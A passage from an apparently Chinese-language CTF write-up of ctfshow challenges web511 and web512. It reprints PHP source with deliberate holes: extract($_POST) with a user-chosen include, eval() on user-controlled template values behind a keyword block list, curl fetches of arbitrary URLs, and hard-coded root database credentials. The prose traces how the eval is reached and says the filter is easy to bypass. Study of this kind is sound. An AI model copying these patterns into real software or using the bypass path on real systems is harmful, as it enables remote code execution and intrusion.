class="variable">$ret</span>));</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;请登录后使用此功能&#x27;</span>;</span><br><span class="line">	<span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>api&#x2F;admin_file_view.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-24 00:53:45</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-25 15:46:06</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$user</span>= <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line">		<span class="string">&quot;code&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line">		<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;查询失败&quot;</span>,</span><br><span class="line">		<span class="string">&quot;count&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line">		<span class="string">&quot;data&quot;</span>=&gt;<span class="keyword">array</span>()</span><br><span class="line">	);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line">	<span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/php|sml|phar|\:|data|file|sess/i&#x27;</span>, <span class="variable">$f</span>))&#123;</span><br><span class="line">                <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;请不要使用此功能&#x27;</span>;</span><br><span class="line">                <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$debug</span>==<span class="number">1</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^user/&#x27;</span>, <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$f</span>)))&#123;</span><br><span class="line">                <span class="keyword">include</span>(<span class="variable">$f</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$ret</span>[<span class="string">&#x27;data&#x27;</span>]=<span class="keyword">array</span>(<span class="string">&#x27;contents&#x27;</span>=&gt;<span class="title function_ invoke__">file_get_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../&#x27;</span>.<span class="variable">$name</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;查看成功&#x27;</span>;</span><br><span class="line">        <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;请登录后使用此功能&#x27;</span>;</span><br><span class="line">	<span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>render&#x2F;render_class.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 17:52:18</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-25 17:19:10</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;file_class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;cache_class.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">templateUtil</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params"><span class="variable">$template</span>,<span class="variable">$arg</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span>&#123;</span><br><span class="line">		<span class="variable">$templateContent</span>=file<span class="title class_">Util</span>::<span class="title function_ invoke__">read</span>(<span class="string">&#x27;templates/&#x27;</span>.<span class="variable">$template</span>.<span class="string">&#x27;.sml&#x27;</span>);</span><br><span class="line">		<span class="variable">$cache</span>=template<span class="title class_">Util</span>::<span class="title function_ invoke__">shade</span>(<span class="variable">$templateContent</span>,<span class="variable">$arg</span>);</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$cache</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span>  <span class="function"><span class="keyword">function</span> <span class="title">shade</span>(<span class="params"><span class="variable">$templateContent</span>,<span class="variable">$arg</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span>&#123;</span><br><span class="line">		<span class="variable">$templateContent</span>=template<span class="title class_">Util</span>::<span class="title function_ invoke__">checkImage</span>(<span class="variable">$templateContent</span>,<span class="variable">$arg</span>);</span><br><span class="line">		<span class="variable">$templateContent</span>=template<span class="title class_">Util</span>::<span class="title function_ invoke__">checkConfig</span>(<span class="variable">$templateContent</span>);</span><br><span class="line">		<span class="variable">$templateContent</span>=template<span class="title class_">Util</span>::<span class="title function_ invoke__">checkVar</span>(<span class="variable">$templateContent</span>,<span class="variable">$arg</span>);</span><br><span class="line">		<span class="keyword">foreach</span> (<span class="variable">$arg</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">			<span class="variable">$templateContent</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;&#123;&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>, <span class="variable">$value</span>, <span class="variable">$templateContent</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$templateContent</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params"><span class="variable">$templateContent</span>,<span class="variable">$arg</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span>&#123;</span><br><span class="line">		<span class="keyword">foreach</span> (<span class="variable">$arg</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/gopher|file/i&#x27;</span>, <span class="variable">$value</span>))&#123;</span><br><span class="line">				<span class="variable">$templateContent</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;&#123;img:&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$templateContent</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$templateContent</span>, <span class="string">&#x27;&#123;&#123;img:&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>))&#123;</span><br><span class="line">				<span class="variable">$encode</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">				<span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$value</span>)))&#123;</span><br><span class="line">					<span class="variable">$encode</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$value</span>));</span><br><span class="line">				&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">					<span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$value</span>);</span><br><span class="line">					<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">					<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">					<span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">					<span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">					<span class="variable">$ret</span>=<span class="title function_ invoke__">chunk_split</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$result</span>));</span><br><span class="line">					<span class="variable">$encode</span> = <span class="string">&#x27;data:image/jpg/png/gif;base64,&#x27;</span> . <span class="variable">$ret</span>;</span><br><span class="line">					<span class="title function_ invoke__">file_put_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$value</span>), <span class="variable">$encode</span>);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="variable">$templateContent</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;&#123;img:&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>, <span class="variable">$encode</span>, <span class="variable">$templateContent</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$templateContent</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkConfig</span>(<span class="params"><span class="variable">$templateContent</span></span>)</span>&#123;</span><br><span class="line">		<span class="variable">$config</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../config/settings&#x27;</span>));</span><br><span class="line">		<span class="keyword">foreach</span> (<span class="variable">$config</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$templateContent</span>, <span class="string">&#x27;&#123;&#123;config:&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>))&#123;</span><br><span class="line">				<span class="variable">$templateContent</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;&#123;config:&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>, <span class="variable">$value</span>, <span class="variable">$templateContent</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$templateContent</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVar</span>(<span class="params"><span class="variable">$templateContent</span>,<span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">foreach</span> (<span class="variable">$arg</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$templateContent</span>, <span class="string">&#x27;&#123;&#123;var:&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>))&#123;</span><br><span class="line">				<span class="keyword">eval</span>(<span class="string">&#x27;$v=&#x27;</span>.<span class="variable">$value</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">				<span class="variable">$templateContent</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;&#123;var:&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>, <span class="variable">$v</span>, <span class="variable">$templateContent</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$templateContent</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这次得分析别的文件了在render&#x2F;render_class.php下面找到一个eval(),我们看看参数可不可控</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220414135942222.png" alt="image-20220414135942222"></p>
<p>shade调用了checkvar()</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220414140114969.png" alt="image-20220414140114969"></p>
<p>render调用了shade(),先读取了这个模板文件</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220414140311853.png" alt="image-20220414140311853"></p>
<p>这个render总共有六处调用其中有两处传了arg参数,这里当然只有传参的才能利用,其他的就不看了</p>
<p>要想利用,只能去更改$user这个数组里面的值,那么我们去搜索哪里可以更改$_SESSION[‘user’]的值</p>
<p>发现在admin_deit.php存在</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220414141131861.png" alt="image-20220414141131861"></p>
<p>这里的avatar仅仅过滤了几个字符简单可以绕过</p>
<p>先改一下</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220414141636372.png" alt="image-20220414141636372"></p>
<p>接着index访问这个</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220414141707910.png" alt="image-20220414141707910"></p>
<p>接着读取文件</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220414141804254.png" alt="image-20220414141804254"></p>
<p>到这里我们还需要一个可以存在这里的<code>&#123;&#123;var:'.$key.'&#125;&#125;</code>也就是<code>&#123;&#123;var:'.$key.'&#125;&#125;</code>,我们之间上传一个就好了啊<code>&#123;&#123;var:nickname&#125;&#125;</code></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220414141747100.png" alt="image-20220414141747100"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220414145931393.png" alt="image-20220414145931393"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220414150059799.png" alt="image-20220414150059799"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220414145937985.png" alt="image-20220414145937985"></p>
<p>这里要注意stripos()函数,如果在第一位的话就执行不了了</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220414145955200.png" alt="image-20220414145955200"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220414190915815.png"></p>
<h1 id="web512"><a href="#web512" class="headerlink" title="web512"></a>web512</h1><p>render&#x2F;render_class.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 17:52:18</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-25 21:15:03</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;file_class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;cache_class.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">templateUtil</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params"><span class="variable">$template</span>,<span class="variable">$arg</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span>&#123;</span><br><span class="line">		<span class="variable">$templateContent</span>=file<span class="title class_">Util</span>::<span class="title function_ invoke__">read</span>(<span class="string">&#x27;templates/&#x27;</span>.<span class="variable">$template</span>.<span class="string">&#x27;.sml&#x27;</span>);</span><br><span class="line">		<span class="variable">$cache</span>=template<span class="title class_">Util</span>::<span class="title function_ invoke__">shade</span>(<span class="variable">$templateContent</span>,<span class="variable">$arg</span>);</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$cache</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span>  <span class="function"><span class="keyword">function</span> <span class="title">shade</span>(<span class="params"><span class="variable">$templateContent</span>,<span class="variable">$arg</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span>&#123;</span><br><span class="line">		<span class="variable">$templateContent</span>=template<span class="title class_">Util</span>::<span class="title function_ invoke__">checkImage</span>(<span class="variable">$templateContent</span>,<span class="variable">$arg</span>);</span><br><span class="line">		<span class="variable">$templateContent</span>=template<span class="title class_">Util</span>::<span class="title function_ invoke__">checkConfig</span>(<span class="variable">$templateContent</span>);</span><br><span class="line">		<span class="variable">$templateContent</span>=template<span class="title class_">Util</span>::<span class="title function_ invoke__">checkVar</span>(<span class="variable">$templateContent</span>,<span class="variable">$arg</span>);</span><br><span class="line">		<span class="keyword">foreach</span> (<span class="variable">$arg</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">			<span class="variable">$templateContent</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;&#123;&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>, <span class="variable">$value</span>, <span class="variable">$templateContent</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$templateContent</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params"><span class="variable">$templateContent</span>,<span class="variable">$arg</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span>&#123;</span><br><span class="line">		<span class="keyword">foreach</span> (<span class="variable">$arg</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/gopher|file/i&#x27;</span>, <span class="variable">$value</span>))&#123;</span><br><span class="line">				<span class="variable">$templateContent</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;&#123;img:&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$templateContent</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$templateContent</span>, <span class="string">&#x27;&#123;&#123;img:&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>))&#123;</span><br><span class="line">				<span class="variable">$encode</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">				<span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$value</span>)))&#123;</span><br><span class="line">					<span class="variable">$encode</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$value</span>));</span><br><span class="line">				&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">					<span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$value</span>);</span><br><span class="line">					<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">					<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">					<span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">					<span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">					<span class="variable">$ret</span>=<span class="title function_ invoke__">chunk_split</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$result</span>));</span><br><span class="line">					<span class="variable">$encode</span> = <span class="string">&#x27;data:image/jpg/png/gif;base64,&#x27;</span> . <span class="variable">$ret</span>;</span><br><span class="line">					<span class="title function_ invoke__">file_put_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$value</span>), <span class="variable">$encode</span>);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="variable">$templateContent</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;&#123;img:&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>, <span class="variable">$encode</span>, <span class="variable">$templateContent</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$templateContent</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkConfig</span>(<span class="params"><span class="variable">$templateContent</span></span>)</span>&#123;</span><br><span class="line">		<span class="variable">$config</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../config/settings&#x27;</span>));</span><br><span class="line">		<span class="keyword">foreach</span> (<span class="variable">$config</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$templateContent</span>, <span class="string">&#x27;&#123;&#123;config:&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>))&#123;</span><br><span class="line">				<span class="variable">$templateContent</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;&#123;config:&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>, <span class="variable">$value</span>, <span class="variable">$templateContent</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$templateContent</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVar</span>(<span class="params"><span class="variable">$templateContent</span>,<span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line">		<span class="variable">$db</span>=<span class="keyword">new</span> <span class="title class_">db</span>();</span><br><span class="line">		<span class="keyword">foreach</span> (<span class="variable">$arg</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$templateContent</span>, <span class="string">&#x27;&#123;&#123;var:&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>))&#123;</span><br><span class="line">				<span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\(|\[|\`|\&#x27;|\&quot;|\+|nginx|\)|\]|include|data|text|filter|input|file|require|GET|POST|COOKIE|SESSION|file/i&#x27;</span>, <span class="variable">$value</span>))&#123;</span><br><span class="line">					<span class="keyword">eval</span>(<span class="string">&#x27;$v=&#x27;</span>.<span class="variable">$value</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">					<span class="variable">$templateContent</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;&#123;var:&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>, <span class="variable">$v</span>, <span class="variable">$templateContent</span>);</span><br><span class="line">				&#125;</span><br><span class="line">				</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$templateContent</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里要进行拼接</p>
<p>db_class.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 20:43:40</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-15 05:02:27</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">db</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$log</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sql</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$port</span>=<span class="string">&#x27;3306&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$addr</span>=<span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$database</span>=<span class="string">&#x27;ctfshow&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;log=<span class="keyword">new</span> <span class="title class_">dbLog</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db=<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getConnection</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getConnection</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">mysqli</span>(<span class="variable language_">$this</span>-&gt;addr,<span class="variable language_">$this</span>-&gt;username,<span class="variable language_">$this</span>-&gt;password,<span class="variable language_">$this</span>-&gt;database);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">select_one</span>(<span class="params"><span class="variable">$sql</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;sql=<span class="variable">$sql</span>;</span><br><span class="line">        <span class="variable">$result</span>=<span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span 